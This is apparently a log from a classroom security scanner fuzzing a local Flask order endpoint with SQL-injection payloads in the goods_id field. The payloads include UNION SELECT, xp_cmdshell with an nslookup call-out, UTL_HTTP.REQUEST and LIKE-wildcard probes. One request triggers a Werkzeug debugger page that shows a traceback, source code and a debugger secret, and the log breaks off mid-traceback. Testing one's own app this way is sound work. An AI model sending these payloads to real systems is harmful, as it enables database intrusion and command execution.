[INFO]00:18:07:095-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": ",@variable\n"}}
[INFO]00:18:07:095-caseScan.py:113 >> code: 403
[INFO]00:18:07:096-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:127-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "PRINT\n"}}
[INFO]00:18:07:127-caseScan.py:113 >> code: 403
[INFO]00:18:07:128-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:161-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "PRINT @@variable\n"}}
[INFO]00:18:07:161-caseScan.py:113 >> code: 403
[INFO]00:18:07:162-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:191-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "select\n"}}
[INFO]00:18:07:191-caseScan.py:113 >> code: 403
[INFO]00:18:07:192-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:220-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "insert\n"}}
[INFO]00:18:07:221-caseScan.py:113 >> code: 403
[INFO]00:18:07:251-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:283-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "as\n"}}
[INFO]00:18:07:283-caseScan.py:113 >> code: 403
[INFO]00:18:07:284-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:328-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "or\n"}}
[INFO]00:18:07:329-caseScan.py:113 >> code: 403
[INFO]00:18:07:329-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:361-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "procedure\n"}}
[INFO]00:18:07:362-caseScan.py:113 >> code: 403
[INFO]00:18:07:362-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:393-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "limit\n"}}
[INFO]00:18:07:393-caseScan.py:113 >> code: 403
[INFO]00:18:07:394-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:424-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "order by\n"}}
[INFO]00:18:07:425-caseScan.py:113 >> code: 403
[INFO]00:18:07:425-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:455-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "asc\n"}}
[INFO]00:18:07:456-caseScan.py:113 >> code: 403
[INFO]00:18:07:456-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:485-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "desc\n"}}
[INFO]00:18:07:486-caseScan.py:113 >> code: 403
[INFO]00:18:07:486-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:517-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "delete\n"}}
[INFO]00:18:07:517-caseScan.py:113 >> code: 403
[INFO]00:18:07:518-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:547-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "update\n"}}
[INFO]00:18:07:548-caseScan.py:113 >> code: 403
[INFO]00:18:07:549-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:579-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "distinct\n"}}
[INFO]00:18:07:579-caseScan.py:113 >> code: 403
[INFO]00:18:07:580-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:616-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "having\n"}}
[INFO]00:18:07:616-caseScan.py:113 >> code: 403
[INFO]00:18:07:617-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:645-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "truncate\n"}}
[INFO]00:18:07:646-caseScan.py:113 >> code: 403
[INFO]00:18:07:646-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:677-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "replace\n"}}
[INFO]00:18:07:677-caseScan.py:113 >> code: 403
[INFO]00:18:07:678-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:708-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "like\n"}}
[INFO]00:18:07:709-caseScan.py:113 >> code: 403
[INFO]00:18:07:709-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:736-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "handler\n"}}
[INFO]00:18:07:737-caseScan.py:113 >> code: 403
[INFO]00:18:07:738-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:765-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "bfilename\n"}}
[INFO]00:18:07:765-caseScan.py:113 >> code: 403
[INFO]00:18:07:766-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:795-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or username like '%\n"}}
[INFO]00:18:07:796-caseScan.py:113 >> code: 403
[INFO]00:18:07:796-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:829-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or uname like '%\n"}}
[INFO]00:18:07:829-caseScan.py:113 >> code: 403
[INFO]00:18:07:830-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:860-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or userid like '%\n"}}
[INFO]00:18:07:861-caseScan.py:113 >> code: 403
[INFO]00:18:07:861-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:890-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or uid like '%\n"}}
[INFO]00:18:07:891-caseScan.py:113 >> code: 403
[INFO]00:18:07:891-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:934-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or user like '%\n"}}
[INFO]00:18:07:935-caseScan.py:113 >> code: 403
[INFO]00:18:07:937-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:968-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "exec xp\n"}}
[INFO]00:18:07:969-caseScan.py:113 >> code: 403
[INFO]00:18:07:969-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:999-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "exec sp\n"}}
[INFO]00:18:07:999-caseScan.py:113 >> code: 403
[INFO]00:18:08:000-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:028-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'; exec master..xp_cmdshell\n"}}
[INFO]00:18:08:028-caseScan.py:113 >> code: 403
[INFO]00:18:08:029-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:059-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'; exec xp_regread\n"}}
[INFO]00:18:08:060-caseScan.py:113 >> code: 403
[INFO]00:18:08:060-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:090-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "t'exec master..xp_cmdshell 'nslookup www.google.com'--\n"}}
[INFO]00:18:08:090-caseScan.py:113 >> code: 403
[INFO]00:18:08:091-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:119-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "--sp_password\n"}}
[INFO]00:18:08:120-caseScan.py:113 >> code: 403
[INFO]00:18:08:120-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:148-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\\x27UNION SELECT\n"}}
[INFO]00:18:08:148-caseScan.py:113 >> code: 403
[INFO]00:18:08:149-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:179-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' UNION SELECT\n"}}
[INFO]00:18:08:179-caseScan.py:113 >> code: 403
[INFO]00:18:08:180-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:210-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' UNION ALL SELECT\n"}}
[INFO]00:18:08:211-caseScan.py:113 >> code: 403
[INFO]00:18:08:211-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:239-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or (EXISTS)\n"}}
[INFO]00:18:08:239-caseScan.py:113 >> code: 403
[INFO]00:18:08:240-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:268-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' (select top 1\n"}}
[INFO]00:18:08:268-caseScan.py:113 >> code: 403
[INFO]00:18:08:269-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:299-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'||UTL_HTTP.REQUEST\n"}}
[INFO]00:18:08:299-caseScan.py:113 >> code: 403
[INFO]00:18:08:300-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:378-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "1;SELECT%20*\n"}}
[INFO]00:18:08:379-caseScan.py:113 >> code: 500
[INFO]00:18:08:380-caseScan.py:114 >> response: <!doctype html>
<html lang=en>
  <head>
    <title>pymysql.err.OperationalError: (1292, &#34;Truncated incorrect DOUBLE value: &#39;1;SELECT%20*\n&#39;&#34;)
 // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "f14cIhWZsCFSqB7Czdcp";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>OperationalError</h1>
<div class="detail">
  <p class="errormsg">pymysql.err.OperationalError: (1292, &#34;Truncated incorrect DOUBLE value: &#39;1;SELECT%20*\n&#39;&#34;)
</p>
</div>
<h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
<div class="traceback">
  <h3></h3>
  <ul><li><div class="frame" id="frame-1754717924528">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">2213</em>,
      in <code class="function">__call__</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">    </span>def __call__(self, environ: dict, start_response: t.Callable) -&gt; t.Any:</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;The WSGI server calls the Flask application object as the</pre>
<pre class="line before"><span class="ws">        </span>WSGI application. This calls :meth:`wsgi_app`, which can be</pre>
<pre class="line before"><span class="ws">        </span>wrapped to apply middleware.</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;</pre>
<pre class="line current"><span class="ws">        </span>return self.wsgi_app(environ, start_response)
<span class="ws">        </span>       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre></div>
</div>

<li><div class="frame" id="frame-1754717922800">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">2193</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line before"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line before"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line before"><span class="ws">                </span>error = e</pre>
<pre class="line current"><span class="ws">                </span>response = self.handle_exception(e)
<span class="ws">                </span>           ^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre>
<pre class="line after"><span class="ws">                </span>raise</pre>
<pre class="line after"><span class="ws">            </span>return response(environ, start_response)</pre>
<pre class="line after"><span class="ws">        </span>finally:</pre></div>
</div>

<li><div class="frame" id="frame-1754717921504">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">2190</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>ctx = self.request_context(environ)</pre>
<pre class="line before"><span class="ws">        </span>error: BaseException | None = None</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line current"><span class="ws">                </span>response = self.full_dispatch_request()
<span class="ws">                </span>           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">                </span>error = e</pre>
<pre class="line after"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre></div>
</div>

<li><div class="frame" id="frame-1754717923232">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">1486</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line before"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line before"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line current"><span class="ws">            </span>rv = self.handle_user_exception(e)
<span class="ws">            </span>     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre>
<pre class="line after"><span class="ws">        </span>self,</pre>
<pre class="line after"><span class="ws">        </span>rv: ft.ResponseReturnValue | HTTPException,</pre></div>
</div>

<li><div class="frame" id="frame-1754717919344">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">1484</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line current"><span class="ws">                </span>rv = self.dispatch_request()
<span class="ws">                </span>     ^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre></div>
</div>

<li><div class="frame" id="frame-1754717924096">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">1469</em>,
      in <code class="function">dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>and req.method == &#34;OPTIONS&#34;</pre>
<pre class="line before"><span class="ws">        </span>):</pre>
<pre class="line before"><span class="ws">            </span>return self.make_default_options_response()</pre>
<pre class="line before"><span class="ws">        </span># otherwise dispatch to the handler for that endpoint</pre>
<pre class="line before"><span class="ws">        </span>view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]</pre>
<pre class="line current"><span class="ws">        </span>return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
<span class="ws">        </span>       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def full_dispatch_request(self) -&gt; Response:</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Dispatches the request and on top of that performs request</pre>
<pre class="line after"><span class="ws">        </span>pre and postprocessing as well as HTTP exception catching and</pre>
<pre class="line after"><span class="ws">        </span>error handling.</pre></div>
</div>

<li><div class="frame" id="frame-1754717925536">
  <h4>File <cite class="filename">"E:\classPro\1204Pro\orderApp\server.py"</cite>,
      line <em class="line">116</em>,
      in <code class="function">create</code></h4>
  <div class="source "><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>sql = f&#39;update goods set count = {goods_count - request.json[&#34;goods_count&#34;]} where goods_id = %s&#39;</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>info(f&#39;{client_connect}: execute sql &gt;&gt;{sql}&#39;)</pre>
<pre class="line before"><span class="ws">    </span>val = (request.json[&#39;goods_id&#39;],)</pre>
<pre class="line current"><span class="ws">    </span>cursor.execute(sql, val)
<span class="ws">    </span>^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">    </span>conn.commit()</pre>
<pre class="line after"><span class="ws">    </span>info(f&#39;{client_connect}: execute success&#39;)</pre>
<pre class="line after"><span class="ws">    </span># 生成订单 存储订单数据</pre>
<pre class="line after"><span class="ws">    </span>order_id = &#39;OI&#39; + str(int(time.time() * 1000000))</pre>
<pre class="line after"><span class="ws">    </span>info(f&#39;{client_connect}: order_id &gt;&gt; {order_id}&#39;)</pre></div>
</div>

<li><div class="frame" id="frame-1754717920928">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\dbutils\steady_db.py"</cite>,
      line <em class="line">691</em>,
      in <code class="function">tough_method</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">                        </span>con2.close()</pre>
<pre class="line before"><span class="ws">                    </span>except Exception:</pre>
<pre class="line before"><span class="ws">                        </span>pass</pre>
<pre class="line before"><span class="ws">                </span>if transaction:</pre>
<pre class="line before"><span class="ws">                    </span>self._transaction = False</pre>
<pre class="line current"><span class="ws">                </span>raise error  # re-raise the original error again
<span class="ws">                </span>^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">            </span>else:</pre>
<pre class="line after"><span class="ws">                </span>con._usage += 1</pre>
<pre class="line after"><span class="ws">                </span>return result</pre>
<pre class="line after"><span class="ws">        </span>return tough_method</pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-1754718680928">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\dbutils\steady_db.py"</cite>,
      line <em class="line">610</em>,
      in <code class="function">tough_method</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">                        </span>and not transaction):</pre>
<pre class="line before"><span class="ws">                    </span>raise con._failure</pre>
<pre class="line before"><span class="ws">                </span>if execute:</pre>
<pre class="line before"><span class="ws">                    </span>self._setsizes()</pre>
<pre class="line before"><span class="ws">                </span>method = getattr(self._cursor, name)</pre>
<pre class="line current"><span class="ws">                </span>result = method(*args, **kwargs)  # try to execute
<span class="ws">                </span>         ^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">                </span>if execute:</pre>
<pre class="line after"><span class="ws">                    </span>self._clearsizes()</pre>
<pre class="line after"><span class="ws">            </span>except con._failures as error:  # execution error</pre>
<pre class="line after"><span class="ws">                </span>if not transaction:</pre>
<pre class="line after"><span class="ws">                    </span>try:</pre></div>
</div>

<li><div class="frame" id="frame-1754718680784">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\cursors.py"</cite>,
      line <em class="line">158</em>,
      in <code class="function">execute</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>while self.nextset():</pre>
<pre class="line before"><span class="ws">            </span>pass</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>query = self.mogrify(query, args)</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line current"><span class="ws">        </span>result = self._query(query)
<span class="ws">        </span>         ^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>self._executed = query</pre>
<pre class="line after"><span class="ws">        </span>return result</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def executemany(self, query, args):</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Run several data against one query.</pre></div>
</div>

<li><div class="frame" id="frame-1754718682080">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\cursors.py"</cite>,
      line <em class="line">325</em>,
      in <code class="function">_query</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>self.rownumber = r</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>def _query(self, q):</pre>
<pre class="line before"><span class="ws">        </span>conn = self._get_db()</pre>
<pre class="line before"><span class="ws">        </span>self._clear_result()</pre>
<pre class="line current"><span class="ws">        </span>conn.query(q)
<span class="ws">        </span>^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>self._do_get_result()</pre>
<pre class="line after"><span class="ws">        </span>return self.rowcount</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def _clear_result(self):</pre>
<pre class="line after"><span class="ws">        </span>self.rownumber = 0</pre></div>
</div>

<li><div class="frame" id="frame-1754718680352">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\connections.py"</cite>,
      line <em class="line">549</em>,
      in <code class="function">query</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span># if DEBUG:</pre>
<pre class="line before"><span class="ws">        </span>#     print(&#34;DEBUG: sending query:&#34;, sql)</pre>
<pre class="line before"><span class="ws">        </span>if isinstance(sql, str):</pre>
<pre class="line before"><span class="ws">            </span>sql = sql.encode(self.encoding, &#34;surrogateescape&#34;)</pre>
<pre class="line before"><span class="ws">        </span>self._execute_command(COMMAND.COM_QUERY, sql)</pre>
<pre class="line current"><span class="ws">        </span>self._affected_rows = self._read_query_result(unbuffered=unbuffered)
<span class="ws">        </span>                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>return self._affected_rows</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def next_result(self, unbuffered=False):</pre>
<pre class="line after"><span class="ws">        </span>self._affected_rows = self._read_query_result(unbuffered=unbuffered)</pre>
<pre class="line after"><span class="ws">        </span>return self._affected_rows</pre></div>
</div>

<li><div class="frame" id="frame-1754718682800">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\connections.py"</cite>,
      line <em class="line">779</em>,
      in <code class="function">_read_query_result</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">                </span>result.unbuffered_active = False</pre>
<pre class="line before"><span class="ws">                </span>result.connection = None</pre>
<pre class="line before"><span class="ws">                </span>raise</pre>
<pre class="line before"><span class="ws">        </span>else:</pre>
<pre class="line before"><span class="ws">            </span>result = MySQLResult(self)</pre>
<pre class="line current"><span class="ws">            </span>result.read()
<span class="ws">            </span>^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>self._result = result</pre>
<pre class="line after"><span class="ws">        </span>if result.server_status is not None:</pre>
<pre class="line after"><span class="ws">            </span>self.server_status = result.server_status</pre>
<pre class="line after"><span class="ws">        </span>return result.affected_rows</pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-1754718682224">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\connections.py"</cite>,
      line <em class="line">1157</em>,
      in <code class="function">read</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>if self.unbuffered_active:</pre>
<pre class="line before"><span class="ws">            </span>self._finish_unbuffered_query()</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>def read(self):</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line current"><span class="ws">            </span>first_packet = self.connection._read_packet()
<span class="ws">            </span>               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">            </span>if first_packet.is_ok_packet():</pre>
<pre class="line after"><span class="ws">                </span>self._read_ok_packet(first_packet)</pre>
<pre class="line after"><span class="ws">            </span>elif first_packet.is_load_local_packet():</pre>
<pre class="line after"><span class="ws">                </span>self._read_load_local_packet(first_packet)</pre></div>
</div>

<li><div class="frame" id="frame-1754718682656">
